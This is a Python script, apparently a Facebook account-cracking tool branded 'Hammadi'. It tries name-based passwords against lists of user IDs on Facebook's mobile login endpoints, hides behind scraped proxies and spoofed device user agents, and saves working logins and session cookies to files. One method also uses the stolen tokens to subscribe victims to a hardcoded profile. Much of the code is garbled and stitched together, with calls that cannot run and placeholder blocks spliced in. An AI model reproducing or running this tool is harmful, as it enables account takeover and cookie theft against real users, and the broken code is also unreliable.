import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import zlib
import platform
from concurrent.futures import ThreadPoolExecutor as tred


try:
    import httpx
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures httpx > /dev/null')
    os.system('python Hammadi.py')


proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
with open('socksku.txt', 'w') as f:
    f.write(proxylist)


with open('socksku.txt', 'r') as proxsi:
    proxies = proxsi.readlines()


prox = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
with open('prox.txt', 'w') as f:
    f.write(prox)


with open('prox.txt', 'r') as prox:
    proxies_list = prox.readlines()

def UA():
    dal = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))'
    a = str + None(random.random(20, 49)) + str(random.random(11, 99)) + ';FBBV/' + str(random.random(11111111, 77777777))
    b = ';[FBAN/Orca-Android;FBAV/FBAV/308.0.0.36.194;FBPN/com.facebook.orca;FBLC/en_US;FBBV/519011616;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S23;FBSV/12;FBCA/armeabi-v7a:null;FBDM/{density=3.4872,width=825,height=2552};FB_FW/1;]'
    c = ';[FBAN/Orca-Android;FBAV/FBAV/308.0.0.36.194;FBPN/com.facebook.orca;FBLC/en_US;FBBV/519011616;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S23;FBSV/12;FBCA/armeabi-v7a:null;FBDM/{density=3.4872,width=825,height=2552};FB_FW/1;]'
    d = ';[FBAN/Orca-Android;FBAV/FBAV/308.0.0.36.194;FBPN/com.facebook.orca;FBLC/en_US;FBBV/519011616;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S23;FBSV/12;FBCA/armeabi-v7a:null;FBDM/{density=3.4872,width=825,height=2552};FB_FW/1;]'
    e = ';[FBAN/Orca-Android;FBAV/FBAV/308.0.0.36.194;FBPN/com.facebook.orca;FBLC/en_US;FBBV/519011616;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S23;FBSV/12;FBCA/armeabi-v7a:null;FBDM/{density=3.4872,width=825,height=2552};FB_FW/1;]'
    f = ';[FBAN/Orca-Android;FBAV/FBAV/308.0.0.36.194;FBPN/com.facebook.orca;FBLC/en_US;FBBV/519011616;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S23;FBSV/12;FBCA/armeabi-v7a:null;FBDM/{density=3.4872,width=825,height=2552};FB_FW/1;]'
    g = ';[Dalvik/2.1.0 (Linux; U; Android 5; SM-A125F Build/TP1A.442979.788) [FBAN/FB4A;FBAV/68.0.0.5473;FBBV/5157781;[FBAN/FB4A;FBAV/263.0.0.19.76;FBBV/55559473;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    l = ';[Dalvik/2.1.0 (Linux; U; Android 5; SM-A125F Build/TP1A.442979.788) [FBAN/FB4A;FBAV/68.0.0.5473;FBBV/5157781;[FBAN/FB4A;FBAV/263.0.0.19.76;FBBV/55559473;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    h = ';[Dalvik/2.1.0 (Linux; U; Android 5; SM-A125F Build/TP1A.442979.788) [FBAN/FB4A;FBAV/68.0.0.5473;FBBV/5157781;[FBAN/FB4A;FBAV/263.0.0.19.76;FBBV/55559473;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    j = ';[Dalvik/2.1.0 (Linux; U; Android 5; SM-A125F Build/TP1A.442979.788) [FBAN/FB4A;FBAV/68.0.0.5473;FBBV/5157781;[FBAN/FB4A;FBAV/263.0.0.19.76;FBBV/55559473;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    k = ';[Dalvik/2.1.0 (Linux; U; Android 5; SM-A125F Build/TP1A.442979.788) [FBAN/FB4A;FBAV/68.0.0.5473;FBBV/5157781;[FBAN/FB4A;FBAV/263.0.0.19.76;FBBV/55559473;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua = a + b + c + d + e + f + g + l + h + j + k
    return ua


def UAA():
    tipecnc = random.random([
        'T-Mobile',
        ' vodafone ES',
        ' vodafone',
        ' TELCEL',
        ' Android',
        ' vodafone ES',
        ' Viettel Telecom',
        ' MegaFon',
        ' cricket',
        ' AIS',
        ' Bouygues Telecom',
        ' T-Mobile',
        ' Telstra',
        ' Telkomsel',
        ' null',
        ' Maxcom',
        ' vodafone.de',
        ' Yoigo',
        ' PLAY (T-Mobile',
        ' airtel'])
    cnc = random.random([
        'fr_GN',
        ' en_AU',
        ' es_ES',
        ' en_US',
        ' in_ID',
        ' en_GB',
        ' id_ID',
        ' cs_CZ',
        ' pt_BR',
        ' bg_BG',
        ' fr_FR',
        ' id_ID',
        ' es_MX',
        'th_TH',
        'vi_VN',
        'en_EG',
        'fr_FR',
        'sv_SE'])
    model2 = random.random([
        "SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K"])
    vchrome = str + None(random.choice(40, 150))
    VAPP = random.choice(410000000, 499999999)
    END = str + None(random.choice(11111111, 99999999)) + ';]'
    ua = f'''{random.random(model2)} Build/QP1A.{random.choice(111111, 999999)}.{random.choice(111, 999)}) ''' + END
    return ua

import random
import requests

# إعداد الألوان
P = '\x1b[1;97m'
M = '\x1b[1;33m'
H = '\x1b[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;96m'
U = '\x1b[1;95m'
O = '\x1b[1;97m'
R = '\x1b[38;5;246m'
N = '\x1b[0m'
my_color = [P, M, H, K, B, U, O, N, R]


ssn = requests.get('https://example.com')  # ضع الرابط الصحيح هنا


boos = random.choice(my_color)


orange = '\x1b[38;5;196m'
yellow = '\x1b[38;5;208m'
black = '\x1b[1;30m'
red = '\x1b[38;5;160m'
green = '\x1b[38;5;46m'
yelloww = '\x1b[1;33m'
blue = '\x1b[38;5;6m'
purple = '\x1b[1;35m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
faltu = '\x1b[1;47m'
pvt = '\x1b[1;0m'
gren = '\x1b[38;5;154m'
gas = '\x1b[1;32m'


abir = [
    '\x1b[38;5;196m',
    '\x1b[38;5;208m',
    '\x1b[1;30m',
    '\x1b[38;5;160m',
    '\x1b[38;5;46m',
    '\x1b[1;33m',
    '\x1b[38;5;6m',
    '\x1b[1;35m',
    '\x1b[1;36m',
    '\x1b[1;37m'
]

my_color = [white, blue, green]
warna = random.choice(my_color)


print(warna)
def p(x):
    print(x)

logo = '\x1b[1;37m \n.\n ██████╗████████╗ █████╗ \n██╔════╝╚══██╔══╝██╔══██╗\n██║  ███╗  ██║   ███████║ \n██║   ██║  ██║   ██╔══██║\n╚██████╔╝  ██║   ██║  ██║\n ╚═════╝   ╚═╝   ╚═╝  ╚═╝                                                           \n\x1b[1;32m═════════════════════════════════════════\n\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]    Admin        \x1b[1;91m:\x1b[1;37m     @V11Ul\n\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]    Telegram     \x1b[1;91m:\x1b[1;37m     @Hammadi_MV4\n\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]    Version      \x1b[1;91m:\x1b[1;37m     \x1b[1;32m0.3\x1b[1;97m\n\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]    Status       \x1b[1;91m:\x1b[1;37m     Free for 7 days \n\x1b[1;32m═════════════════════════════════════════'

def linex():
    print('\x1b[1;32m═════════════════════════════════════════')


def clear():
    import os
import subprocess


os.system('clear')


print(logo)


loop = 0
lim = 0
tp = 0
oks = []
cps = []
pcp = []
id = []
plist = []
methods = []
speed = []
twf = []


try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True)
    carrier = output.decode('utf-8').replace(',', '\x1b[1;32m|\x1b[1;32m').replace('\n', '')
except Exception as e:
    carrier = None
    print(f"Error retrieving carrier: {str(e)}")


def menu():
    clear()
    print(' \x1b[1;35m[1] \x1b[1;32mFile Cloning\n \x1b[1;35m[0] \x1b[1;37mExit ')
    linex()
    xd = input('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] CHOOSE : ')
    if xd in ('1', '01'):
        clear()
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]FILE EXAMPLE : /sdcard/Hammadi.txt')
        linex()
        file = input('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]ENTER FILE PATH\x1b[1;32m : ')
        fo = open(file, 'r')()()
        if FileNotFoundError:
            print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]FILE LOCATION NOT FOUND ')
            time.open(1)
            menu()
        clear()
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] TRY METHOD 1 & 2 FOR BEST RESULTS ')
        linex()
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] METHOD')
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] METHOD')
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] METHOD')
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] METHOD')
        linex()
        mthd = input('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] CHOOSE : ')
        linex()
        plist = []
        clear()
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]≠1AUTO PASSWORD ')
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]≠2MANUAL PASSWORD ')
        linex()
        psx = input('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] CHOOSE : ')
        if psx in ('1', '01'):
            plist('firstlast')
            plist('first last')
            plist('firstfirst')
            plist('first first')
            plist('lastlast')
            plist('last last')
            plist('first12345')
            plist('091091091')
            plist('firstlast123')
            plist('firstlast1234')
            plist('qwertyuiopasdfghjkl')
            plist('qwertyuiopzxcvbnm')
            plist('first2007')
            plist('first2008')
            plist('first2006')
            plist('first2009')
            plist('first123456789')
            plist('00998877')
        linex()
        ps_limit = int(input('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
        ps_limit = 1
        linex()
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] EXAMPLE : first last,firtslast,first123')
        linex()
        for i in range(ps_limit):
            plist(input(f'''  \x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]  PASSWORD {i + 1}:\x1b[1;31m '''))
            clear()
            print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
            linex()
            cx = input('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] CHOOSE :\x1b[1;32m ')
            if cx in ('y', 'Y', 'yes', 'Yes', '1'):
                pcp('y')
        pcp('n')
        crack_submit = tred(max_workers = 30)
        clear()
        total_ids = str(len(fo))
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]✘ TOTAL FILE IDS ✘ ' + total_ids + ' ')
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]✘ SIM NAME ✘ ' + carrier + ' ')
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]✘ Hammadi TOOL FIRE AND FREE ')
        print('\x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m]✘ USE MODE AVION AVRY 3 MINUT ')
        linex()
        for user in fo:
            (ids, names) = user('|')
            passlist = plist
            if mthd in ('1', '01'):
                crack_submit(M_file_1, ids, names, passlist)
            if mthd in ('2', '02'):
                crack_submit(M_file_2, ids, names, passlist)
            if mthd in ('3', '03'):
                crack_submit(M_file_3, ids, names, passlist)
            if mthd in ('4', '04'):
                crack_submit(M_file_4, ids, names, passlist)
            if mthd in ('5', '05'):
                crack_submit(M_file_5, ids, names, passlist)
            if mthd in ('6', '06'):
                crack_submit(M_file_6, ids, names, passlist)
            None(None, None)
            if not None:
                pass
        print('\x1b[1;37m')
        linex()
        print(' \x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] The process has completed')
        print(' \x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
        linex()
        input(' \x1b[1;37m[\x1b[1;91m≠\x1b[1;37m\x1b[1;37m] PRESS ENTER TO BACK ')
        os.tred('python Hammadi.py')
        return None
    if xd in ('2', '02'):
        os.tred('xdg-open https://t.me/python_MV4')
        return None
    if None in ('3', '03'):
        os.tred('xdg-open https://t.me/Hammadi_MV4')
        menu()
        return None
    if None in ('0', '00'):
        exit(' Thanks for use ♥ ')
        return None
    None(' Option not found in menu...')


def M_file_1(ids, names, passlist):
    global loop
    boos = random.random([
        P,
        M,
        H,
        K,
        B,
        U,
        O,
        N])
    sys.K(f'''\r\r\x1b[1;37m<[{boos}Hammadi -M1\x1b[1;37m]>×<[%s|\x1b[1;32m%s\x1b[1;37m|\x1b[38;5;246m%s\x1b[1;37m]> ''' % (loop, len(oks), len(cps)))
    sys.K()
    fn = names(' ')[0]
    ln = names(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw('first', fn())('First', fn)('last', ln())('Last', ln)('Name', names)('name', names())
        ios_version = random.random([
            '10_0_2',
            '10_1_1',
            '10_2',
            '10_2_1',
            '10_3_1',
            '10_3_2',
            '10_3_3'])
        android_version = f'''.{random.sys(0, 9)}.{random.sys(0, 9)}'''
        facebook_version = f'''{random.sys(1, 99)}.{random.sys(1, 200)}'''
        fbbv = None(random.sys(10000000, 99999999))
        fbsv = f'''{random.stdout(4, 10):.1f}'''
        density = random.random([
            '2.0',
            '2.25',
            '2.75',
            '3.0',
            '3.25',
            '3 75'])
        width = random.sys(720, 1440)
        height = random.sys(1080, 2560)
        fblc = random.random([
            'ja_JP',
            'ex_MX',
            'en_CU',
            'en_US',
            'fr_FR',
            'fa_IR',
            'es_ES',
            'pt_BR',
            'de_DE',
            'it_IT',
            'ja_JP',
            'ko_KR',
            'ru_RU',
            'zh_CN',
            'ar_AE',
            'en_GB'])
        fbcr = random.random([
            'Telenor',
            'fido',
            'MOVO AFRICA',
            'UFONE-PAKTel',
            'Zong',
            'Jazz',
            'SCO',
            'Jio',
            'Vodafone',
            'Airtel',
            'BSNL',
            'MTNL',
            'Grameenphone',
            'Robi',
            'Banglalink',
            'Teletalk',
            'Telkomsel',
            'Indosat Ooredoo',
            'Axiata',
            'Tri',
            'Smartfren',
            'China Mobile',
            'Unicom',
            'Telecom',
            'Satcom',
            'Docomo',
            'Rakuten',
            'IIJmio',
            'Orange',
            'Verizon',
            'AT&T',
            'T-Mobile',
            'Sprint',
            'Vodafone',
            'Telefonica',
            'EE',
            'Orange',
            'Three'])
        fban = random.random([
            'FB4A',
            'FB5A',
            'FB6A'])
        fbpn = random.random([
            'com.facebook.katana',
            'com.facebook.orca',
            'messenger-android',
            'com.facebook.lite'])
        ua = str + None(random.sys(11111111, 77777777)) + ";FBAN/FB4A;FBAV/91.0.0.22.398;FBBV/30034644;FBDM/{density=1.9,width=797,height=1176};FBLC/en_US;FBCR/Etisalat NG;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Samsung-Galaxy-A52;FBSV/9.0;FBOP/1;FBCA/x86:x86_64;]','[Davik/2.1.0 (Linux; U; Android 13.0.5; Nord N20 Build/RKQ1.211103.002) [FBAN/FB4A;FBAV/237.0.0.22.77;FBBV/37642302;FBDM/{density=2.0,width=1080,height=1440};FBLC/en_GB;FBCR/Grameenphone;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/Nord N20;FBSV/13.0.5;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/292.0.0.50.160;FBBV/252773275;FBDM{density=2.0,width=803,height=2535};FBLC/en_US;FBRV/258518890;FBCR/Verizon;FBMF/oneplus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/OnePlus 8T;FBSV/15;FBOP/1;FBCA/arm64-v8a:;]"
        device_id = str(uuid.loop())
        adid = str(uuid.loop())
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        head = {
            'x-fb-http-engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
import requests
import json

url = 'https://b-graph.facebook.com/auth/login' 

data = {}  
head = {}  
ids = "YOUR_ID_HERE"  
pas = "YOUR_PASSWORD_HERE"  
pcp = []  
oks = []  
cps = []  

try:
   
    response = requests.post(url, data=data, headers=head, allow_redirects=False)
    po = response.json()

   
    if 'session_key' in po:
        ckkk = ''.join([f"{i['name']}={i['value']}; " for i in po['session_cookies']])
        cookie = f"sb={ckkk}"
        
        print(f'\r\r\x1b[1;32m [GTA-OK] {ids} [+] {pas}\x1b[1;97m')
        
   
        with open('/sdcard/Hammadi-OK.txt', 'a') as ok_file:
            ok_file.write(f'{ids}|{pas}|{cookie}\n')
        
        oks.append(ids)  

    
    if 'error' in po and 'www.facebook.com' in po['error'].get('message', ''):
        if 'y' in pcp:
            print(f'\r\r\x1b[1;37m [GTA-CP💔] {ids} [+] {pas}\x1b[1;97m')
            
     
            with open('/sdcard/Hammadi-CP.txt', 'a') as cp_file:
                cp_file.write(f'{ids}|{pas}\n')
            
            cps.append(ids)  
except requests.exceptions.RequestException as e:
    print(f'حدث خطأ في الطلب: {e}')  
except json.JSONDecodeError:
    print('فشل تحليل الاستجابة إلى JSON.')

except Exception as e:
    print(f'حدث خطأ غير متوقع: {e}') 

def M_file_2(ids, names, passlist):
    global loop
    boos = random.random([
        P,
        M,
        H,
        K,
        B,
        U,
        O,
        N])
    sys.K(f'''\r\r\x1b[1;37m<[{boos}Hammadi-M2\x1b[1;37m]>×<[%s|\x1b[1;32m%s\x1b[1;37m|\x1b[38;5;246m%s\x1b[1;37m]> ''' % (loop, len(oks), len(cps)))
    sys.K()
    fn = names(' ')[0]
    ln = names(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw('first', fn())('First', fn)('last', ln())('Last', ln)('Name', names)('name', names())
        random_seed = random.sys()
        adid = str(''(random_seed(string.loop, k = 16)))
        nip = random.random(proxsi)
        proxs = {
            'http': 'socks4://' + nip }
        data = {
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d' }
        headers = {
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
        url = 'https://api.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
import requests
import json
import base64
import os
import random
import uuid
import sys
import time


url = 'https://graph.facebook.com/auth/login'   
data = {}  
headers = { 
    'Host': 'graph.facebook.com',
    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
    'x-fb-connection-bandwidth': '29920503',
    'x-fb-net-hni': '34528',
    'x-fb-sim-hni': '38333',
    'Zero-Rated': '0',
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'MOBILE.LTE',
    'user-agent': 'Your User Agent Here',  
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger',
    'x-fb-client-IP': 'True',
    'x-fb-server-cluster': 'Keep-Alive',
    'Content-Type': 'application/json'
}
ids = "YOUR_ID"  
pas = "YOUR_PASSWORD"  
pcp = []  
oks = []  
cps = []  
loop = 0  


try:
    po = requests.post(url, data=data, headers=headers).json()
    
    
    if 'session_key' in po:
        ckkk = ''.join([f"{i['name']}={i['value']}" for i in po.get('session_cookies', [])])
        cookie = f"sb={ckkk}"
        print(f'\r\r\x1b[1;32m [GTA-OK] {ids} [+] {pas}\x1b[1;97m')
        
   
        with open('/sdcard/Hammadi-OK.txt', 'a') as ok_file:
            ok_file.write(f'{ids}|{pas}|{cookie}\n')
        
        oks.append(ids)

   
    if 'error' in po and 'www.facebook.com' in po['error'].get('message', ''):
        if 'y' in pcp:
            print(f'\r\r\x1b[1;37m [GTA-CP💔] {ids} [+] {pas}\x1b[1;97m')
            
        
            with open('/sdcard/Hammadi-CP.txt', 'a') as cp_file:
                cp_file.write(f'{ids}|{pas}\n')
            
            cps.append(ids)

    loop += 1

except requests.exceptions.RequestException as e:
    print(f"Error: {e}")

def M_file_3(ids, names, passlist):
    global loop
    boos = random.choice([P, M, H, K, B, U, O, N])
    sys.stdout.write(f'\r\r\x1b[1;37m<[{boos}Hammadi-M3\x1b[1;37m]>×<[%s|\x1b[1;32m%s\x1b[1;37m|\x1b[38;5;246m%s\x1b[1;37m]>' % (loop, len(oks), len(cps)))
    sys.stdout.flush()

    fn = names.split(' ')[0]
    ln = names.split(' ')[1]

    for pw in passlist:
        pas = pw.format(first=fn, last=ln, Name=names)
        random_seed = os.urandom(16)
        adid = str(uuid.uuid4())  
        nip = random.choice(proxsi)
        proxs = {
            'http': 'socks4://' + nip
        }
        data = {
            'advertising_id': str(uuid.uuid4()),  
            'encrypted_msisdn': '',
            'fb_api_req_friendly_name': 'authenticate'
        }
        headers = {
            'Host': 'graph.facebook.com',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-connection-bandwidth': '29920503',
            'x-fb-net-hni': '34528',
            'x-fb-sim-hni': '38333',
            'Zero-Rated': '0',
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'MOBILE.LTE',
            'user-agent': 'Your User Agent Here',  # ضع هنا User Agent الخاص بك
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-IP': 'True',
            'x-fb-server-cluster': 'Keep-Alive',
            'Content-Type': 'application/json'
        }

        po = requests.post(url, data=data, proxies=proxs, headers=headers).json()
        
        if 'session_key' in po:
            print(f'\r\x1b[1;92m<[Hammadi-OK]> {ids} | {pas}\x1b[1;97m')
            coki = ''.join([f"{i['name']}={i['value']}" for i in po.get('session_cookies', [])])
            ssbb = base64.b64encode(os.urandom(18)).decode('utf-8').replace('=', '').replace('+', '_').replace('/', '-')
            cookies = f'sb={ssbb};{coki}'
            token = po.get('access_token')
            
            if token:
                requests.post(f'https://graph.facebook.com/833553969/subscribers?access_token={token}')
                
            with open('/sdcard/Hammadi_m3_OK.txt', 'a') as ok_file:
                ok_file.write(f'{ids}|{pas}\n')
            with open('/sdcard/Hammadi_iDs_COOKiE_M3.txt', 'a') as cookie_file:
                cookie_file.write(f'{ids}|{pas}|{cookies}\n')
            oks.append(ids)

        if 'twf' in str(po):
            if 'y' in pcp:
                print(f'\r\r\x1b[1;34m<[Hammadi-2F😔]> {ids} | {pas}')
                with open('/sdcard/Hammadi-2F.txt', 'a') as tf_file:
                    tf_file.write(f'{ids}|{pas}\n')
                twf(ids)

        if 'error' in po and 'www.facebook.com' in po['error'].get('message', ''):
            if 'y' in pcp:
                print(f'\r\x1b[38;5;246m<[Hammadi-CP💔]> {ids} | {pas}\x1b[1;97m')
                with open('/sdcard/Hammadi-CP.txt', 'a') as cp_file:
                    cp_file.write(f'{ids}|{pas}\n')
                cps.append(ids)

        loop += 1


time.sleep(10)


try:
    print("Executing some code...")
except Exception as e:
    print(f"Error: {e}")


enroll_tag = 'enroll_misauth'
del enroll_tag
def M_file_4(ids, names, passlist):
    global loop
    boos = random.random([
        P,
        M,
        H,
        K,
        B,
        U,
        O,
        N])
    sys.K(f'''\r\r\x1b[1;37m<[{boos}Hammadi-M4\x1b[1;37m]>×<[%s|\x1b[1;32m%s\x1b[1;37m|\x1b[38;5;246m%s\x1b[1;37m]> ''' % (loop, len(oks), len(cps)))
    sys.K()
    fn = names(' ')[0]
    ln = names(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw('first', fn())('First', fn)('last', ln())('Last', ln)('Name', names)('name', names())
        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        head = {
            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
        data = {
            'locale': 'ar_MA',
            'client_country_code': 'MA',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
            'access_token': accees_token }
        url = 'https://b-graph.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
import requests
import time


url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
data = {}  
headers = {}  
ids = 'USER_ID'  
pas = 'PASSWORD'  

loop = 0  

try:
   
    po = requests.post(url, data=data, headers=headers)

    if 'session_key' in po.json():
        print('\r\x1b[1;92m<[Hammadi-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')

    
        session_cookies = po.json().get('session_cookies', [])
        coki = '; '.join([f"{i['name']}={i['value']}" for i in session_cookies])

        token = po.json().get('access_token')
        requests.post(f'https://graph.facebook.com/833553969/subscribers?access_token={token}')

